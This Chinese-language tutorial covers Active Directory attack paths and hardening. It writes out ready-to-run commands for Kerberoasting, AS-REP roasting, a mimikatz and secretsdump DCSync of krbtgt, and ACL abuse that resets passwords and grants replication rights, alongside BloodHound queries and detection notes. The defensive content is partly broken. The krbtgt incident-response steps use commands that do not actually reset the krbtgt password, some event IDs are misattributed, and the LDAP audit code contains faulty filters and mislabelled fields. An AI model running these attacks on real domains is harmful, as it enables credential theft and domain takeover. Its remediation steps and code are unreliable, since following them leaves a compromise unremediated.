# Active Directory 攻击路径与防御

## 概述

Active Directory (AD) 是企业网络的核心，也是攻击者最青睐的目标。95% 的 Fortune 1000 公司使用 AD，AD 攻击路径分析是红队和蓝队的必修课。

---

## 1. AD 攻击方法论

### 1.1 攻击链模型

```
侦察           凭证获取        横向移动        权限提升        持久化
  ↓                ↓              ↓              ↓              ↓
BloodHound  →  Kerberoasting →  Pass-the-Hash →  DCSync    →  Golden Ticket
LDAP 查询      AS-REP Roasting   Pass-the-Ticket  ACL 滥用      Skeleton Key
DNS 枚举        LLMNR/NBT-NS     WMI/WinRM        GPO 滥用       DCShadow
端口扫描        密码喷洒          PsExec           KrbRelay       后门账户
```

---

## 2. 关键攻击技术

### 2.1 Kerberoasting

```powershell
# 请求 TGS 票据并离线爆破
# 使用 Rubeus
Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.txt

# 使用 Impacket (Linux)
GetUserSPNs.py domain.local/user:password -request -outputfile hashes.txt

# 离线破解
hashcat -m 13100 kerberoast.txt wordlist.txt --force

# 检测点: 监控 Kerberos 4769 事件（Ticket Granting Service）
# 特定 SPN 请求，异常加密类型（RC4 而非 AES）
```

### 2.2 AS-REP Roasting

```bash
# 攻击无需 Kerberos 预认证的账户
# 获取 TGT 的加密部分，离线爆破

# 使用 Impacket
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat

# 破解
hashcat -m 18200 asrep_hashes.txt wordlist.txt

# 检测: 4768 事件 (TGT 请求)
# 标志: PreAuthType = 0 (未预认证)
```

### 2.3 DCSync

```bash
# 模拟域控制器请求密码哈希
# 需要 Replication-Get-Changes-All 权限

# 使用 Mimikatz
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# 使用 Impacket
secretsdump.py domain.local/user@DC01 -just-dc-user krbtgt

# 检测: 4662 事件 (Directory Service Access)
# GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes)
```

### 2.4 ACL 滥用

```powershell
# 利用 ACL 配置错误提权
# 常见滥用权限：

# 1. ForceChangePassword - 重置目标用户密码
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)

# 2. GenericWrite - 写入 servicePrincipalName
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='nonexistent/BLAH'}

# 3. WriteDacl - 授予 DCSync 权限
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync

# 检测: 5136/5137 事件 (目录服务修改)
```

---

## 3. BloodHound 攻击路径分析

### 3.1 数据采集

```bash
# SharpHound (Windows)
SharpHound.exe -c All -d domain.local --zipfilename bloodhound.zip

# BloodHound.py (Linux)
bloodhound-python -d domain.local -u user -p password -ns DC01.domain.local -c All
```

### 3.2 高风险路径分析

```cypher
// 查找从 Domain Users 到 Domain Admins 的路径
MATCH p = (g:Group {name:'DOMAIN USERS@DOMAIN.LOCAL'})-[*1..]->(a:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})
RETURN p

// 查找具有 DCSync 权限的非特权用户
MATCH (u:User)-[:GenericAll|:WriteDacl|:WriteOwner]->(d:Domain {name:'DOMAIN.LOCAL'})
WHERE NOT u.admincount
RETURN u.name

// 识别 Kerberoastable 的高价值用户
MATCH (u:User {hasspn:true})
WHERE u.highvalue = true
RETURN u.name, u.serviceprincipalnames

// 从工作站到域控的会话关系
MATCH (c:Computer)-[:HasSession]->(u:User)-[:AdminTo]->(dc:Computer)
WHERE dc.operatingsystem =~ '.*Server.*'
RETURN c.name AS CompromisedWorkstation, u.name AS JumpUser, dc.name AS DomainController
```

### 3.3 自动化 AD 安全评估

```python
from ldap3 import Server, Connection, ALL
import re

class ADSecurityAuditor:
    def __init__(self, domain, username, password):
        server = Server(domain, get_info=ALL)
        self.conn = Connection(server, username, password, auto_bind=True)

    def check_kerberoastable_admin(self):
        """检查可 Kerberoasting 的管理员账户"""
        self.conn.search(
            'dc=domain,dc=local',
            '(&(objectClass=user)(servicePrincipalName=*)(adminCount=1))',
            attributes=['sAMAccountName', 'servicePrincipalName']
        )
        return self.conn.entries

    def find_users_without_preauth(self):
        """查找未启用预认证的用户"""
        self.conn.search(
            'dc=domain,dc=local',
            '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
            attributes=['sAMAccountName']
        )
        return self.conn.entries

    def check_password_policy(self):
        """检查密码策略"""
        self.conn.search(
            'dc=domain,dc=local',
            '(objectClass=domainDNS)',
            attributes=['minPwdLength', 'pwdProperties', 'maxPwdAge']
        )
        policies = {}
        for entry in self.conn.entries:
            min_len = entry['minPwdLength'].value if entry['minPwdLength'] else 0
            policies['minPwdLength'] = min_len
            policies['minPwdAge'] = entry['maxPwdAge'].value
        return policies

    def check_stale_accounts(self, days=90):
        """检查长期未登录的账户"""
        self.conn.search(
            'dc=domain,dc=local',
            f'(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(lastLogonTimestamp<={days})))',
            attributes=['sAMAccountName', 'lastLogonTimestamp']
        )
        return self.conn.entries

    def generate_report(self):
        report = {}
        report['kerberoastable_admins'] = [e['sAMAccountName'] for e in self.check_kerberoastable_admin()]
        report['no_preauth_users'] = [e['sAMAccountName'] for e in self.find_users_without_preauth()]
        report['stale_accounts'] = [e['sAMAccountName'] for e in self.check_stale_accounts()]
        return report
```

---

## 4. 防御加固

### 4.1 Tiered 模型

```
Tier 0 (域控 / PKI / ADFS)
    ↑ 只能向下管理
Tier 1 (服务器)
    ↑ 只能向下管理
Tier 2 (工作站 / 用户)
```

**强制规则**：
- Tier 0 账户不能登录 Tier 1/2 设备
- Tier 1 账户不能登录 Tier 0 设备
- 配置 Authentication Policy Silos 限制登录

### 4.2 关键加固项

```yaml
AD 加固清单:
  账户安全:
    - krbtgt 密码双重置 (2次, 间隔 >= 10h)
    - 禁用 NTLMv1, 强制 NTLMv2 + Kerberos
    - 启用 AES Kerberos 加密 (禁用 RC4)
    - AdminCount = 1 的账户放入 Protected Users 组

  ACL 加固:
    - 审计 AdminSDHolder 的 ACL 修改
    - 移除不必要的 GenericAll/WriteDacl 权限
    - 禁止 Domain Users 向域对象添加计算机

  GPO 加固:
    - 禁用 LLMNR / NetBIOS-NS / mDNS
    - 强制 SMB 签名
    - 启用 LDAP 签名与通道绑定
    - 限制 WMI/WinRM 访问

  监控:
    - 异常 Kerberos 票据请求 (4662 事件)
    - 特权组变更 (4728/4732/4756 事件)
    - DC 同步操作 (4662 事件, 特定 GUID)
    - 服务账户创建 (4720 事件)
```

---

## 5. 应急响应场景

### 场景：krbtgt 账户被 DCSync

```bash
# 立即响应步骤：
1. 强制所有域控复制 (repadmin /syncall)
2. 重置 krbtgt 密码 (PowerShell):
   Reset-ComputerMachinePassword -Server DC01

3. 重置并立即再重置 (间隔 >= 10小时):
   # 第一次
   Set-ADUser krbtgt -Replace @{pwdLastSet=0}
   # 等待复制完成
   # 第二次
   Set-ADUser krbtgt -Replace @{pwdLastSet=0}

4. 强制密码重置所有特权用户
5. 撤销所有 Kerberos TGT (重启 KDC 服务或等待 20h)
6. 启动域范围安全审计
```

---

*上一篇: [Windows 安全机制](./05-windows-security.md)*
